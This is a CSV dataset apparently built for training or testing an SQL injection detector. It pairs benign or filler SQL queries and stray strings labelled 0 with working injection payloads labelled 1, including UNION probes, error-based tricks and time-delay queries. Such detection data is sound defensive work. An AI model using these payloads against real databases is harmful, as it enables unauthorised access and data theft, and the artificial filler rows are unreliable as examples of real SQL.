Query,Label
" SELECT * FROM balloon ORDER BY climate, mostly",0
"1' or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"INSERT INTO shoe  ( shinning, serious, hearing )  VALUES  ( 'cheese', 'population', 'shirt' )  ",0
barruecopardo,0
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ",1
SELECT * FROM continent FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM art ORDER BY perfectly,0
8.42194E+15,0
select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
"  SELECT skill,bar,goes FROM seen LEFT JOIN Orders ON balloon.builtID =  shade.married ORDER BY scientist.half",0
13791863m,0
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
"  UPDATE give SET alive =  'post', City =  'hunt' WHERE became =  lose",0
"  SELECT waste AS her, like AS [popular]  FROM shore",0
"1'||  (  select 'bvic' from dual where 4839  =  4839 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",1
SELECT TOP 50 PERCENT * FROM anything,0
SELECT * FROM prove WHERE handsome = 'addition'  OR noted = 'upon',0
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM gold WHERE greatly = 'consonant' LIMIT 3,0
-9072  )   as saot where 2278  =  2278 order by 1#,1
"1'   )    )    as popm where 6594  =  6594 union all select null,null#",1
SELECT MIN ( wooden )  AS sight FROM valuable,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",1
87811832v,0
SELECT * FROM wp_posts WHERE ID  =  28705 LIMIT 1,0
" select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1
"pasaje lucero 147,",0
SELECT TOP 3 * FROM disappear,0
"-3781  )   union all select 3916,3916,3916--",1
"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",1
SELECT TOP 3 * FROM within SELECT * FROM soil 3SELECT * FROM white,0
-1257'  )   order by 1#,1
"1""  )   as ucex where 5148  =  5148 order by 1#",1
SELECT * FROM  ( SELECT swing FROM paper ) ,0
"1""  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"SELECT * FROM few WHERE carry BETWEEN ""circle"" AND    ""him""",0
37609,0
select   (  case when   (  6435  =  8988  )   then 6435 else 6435*  (  select 6435 from information_schema.character_sets  )   end  )  #,1
SELECT AVG ( thick )  FROM hall  SELECT SUM ( shaking ) ,0
calle codigo correspondencia oficial correos-telegrafos 33,0
"1%' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",1
1'  )   where 6842  =  6842,1
mortensen@look2fly.nr,0
"1'  )   and elt  (  3528  =  3566,3566  )  ",1
SELECT * FROM remember 3,0
SELECT AVG ( object )  FROM shot  SELECT SUM ( minerals ) ,0
"-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--",1
